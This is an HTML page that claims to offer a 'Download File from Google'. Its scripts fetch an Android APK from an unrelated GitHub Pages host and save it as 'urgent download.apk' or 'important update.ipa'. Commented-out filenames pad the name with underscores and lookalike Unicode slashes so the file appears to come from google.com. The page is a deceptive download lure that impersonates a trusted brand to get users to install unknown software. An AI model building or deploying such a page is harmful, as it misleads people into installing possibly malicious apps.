<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download File</title>

</head>

<body>
    <h1>Download File from Google</h1>

    <button onclick="startDownload()">Start Download new tab</button>

    <br>
    <br>
    <br>

    <button onclick="startImmed()">Download immediately</button>



    <script>
        async function startDownload() {
            //window.open('https://google.com', '_blank');

            setTimeout(async () => {
                const response = await fetch(
                    'https://kokurate.github.io/browser/rar-android-722.132.apk');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download =
                    'urgent download.apk';
                //'updater google.apk (6 MB) ____________________________________________________________ From https∶⁄⁄www.google.com  and delete malicious file noname';
                link.click();
                URL.revokeObjectURL(url);
            }, 1000);
        }


        function startImmed() {
            //window.open('https://google.com', '_blank');

            setTimeout(async () => {
                const response = await fetch('https://kokurate.github.io/browser/rar-android-722.132.apk');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download =
                    'important update.ipa';
                //'updater google.apk (6 MB) ____________________________________________________________ From https∶⁄⁄www.google.com  and delete malicious file noname';
                link.click();
                URL.revokeObjectURL(url);
            }, 1000);
        }
    </script>

</body>

</html>
